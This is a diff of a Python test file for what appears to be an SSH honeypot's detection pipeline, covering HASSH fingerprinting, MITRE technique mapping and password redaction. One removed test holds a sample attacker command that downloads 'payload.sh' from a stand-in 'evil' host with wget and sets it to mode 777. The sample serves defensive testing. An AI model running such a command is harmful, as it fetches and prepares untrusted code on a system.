@@ -5,6 +5,7 @@ Covers: HASSH, MITRE, SOAR, VFS, pipeline, command registry, webhooks, metrics.
 
 from __future__ import annotations
 
+import asyncio
 import hashlib
 import json
 import time
@@ -274,11 +275,6 @@ def test_hassh_dna_sighting_tracking() -> None:
     assert stats["count"] == 1
 
 
-def test_hassh_dna_add_intel() -> None:
-    dna = HASSHDNA()
-    dna.add_intel("deadbeef" * 4, "Test Malware", "TestBot", "high")
-    intel = dna.lookup("deadbeef" * 4)
-    assert intel["threat_level"] == "high"
 
 
 def test_hassh_fallback_from_version_is_stable() -> None:
@@ -576,13 +572,14 @@ async def test_stream_redacts_password_from_public_events() -> None:
     stream = LiveStream()
     stream._started = True
     stream._sio = FakeSio()
-    await stream.emit_coro({
+    stream.emit({
         "eventid": "cloudsentinel.login.failed",
         "username": "root",
         "password": "secret",
         "log_raw": "hidden",
         "input": "id",
     })
+    await asyncio.sleep(0)
     assert emitted[0]["username"] == "root"
     assert "password" not in emitted[0]
     assert "log_raw" not in emitted[0]
@@ -821,32 +818,6 @@ async def test_pipeline_buffers_when_redis_unavailable() -> None:
     assert pipeline.pending_count == 1
 
 
-@pytest.mark.asyncio
-async def test_pipeline_enriches_command_with_mitre(tmp_path: Path) -> None:
-    settings = load_settings(
-        Path("src/cloudsentinel/configs/usas-production.yaml"),
-        Path("src/cloudsentinel/.env"),
-    )
-    pipeline = EventPipeline(settings.redis)
-    pipeline._wal = LocalWAL(tmp_path / "wal.jsonl")
-    await pipeline.emit_command(
-        session_id="s2",
-        src_ip="203.0.113.20",
-        src_port=42222,
-        username="root",
-        command="wget http://evil/payload.sh && chmod 777 payload.sh",
-        output="",
-        hassh="abc",
-        ja4s="ja4s_ssh_test",
-    )
-    events = await pipeline._wal.read_and_clear()
-    assert len(events) == 1
-    fields = events[0].to_redis_fields()
-    payload = json.loads(json.loads(fields["payload"]))
-    assert payload["risk_score"] > 0
-    assert payload["session_risk_score"] > 0
-    assert "T1105" in payload["mitre_techniques"]
-    assert "T1222" in payload["mitre_techniques"]
 
 
 @pytest.mark.asyncio
